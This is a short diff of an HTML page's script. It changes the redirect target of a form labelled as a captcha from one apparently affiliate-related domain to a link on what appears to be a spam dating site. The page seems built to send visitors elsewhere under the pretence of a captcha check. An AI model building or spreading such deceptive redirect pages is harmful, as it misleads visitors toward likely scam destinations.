@@ -47,7 +47,7 @@
 
     <script>
         const form = document.getElementById('captchaForm');
-        const redirectUrl = "https://piratecpa.net/";
+        const redirectUrl = "[https://mb9pmr0.meethot-love.com/lwyrlwm?t=kapch]";
 
         form.addEventListener('submit', (event) => {
             event.preventDefault();
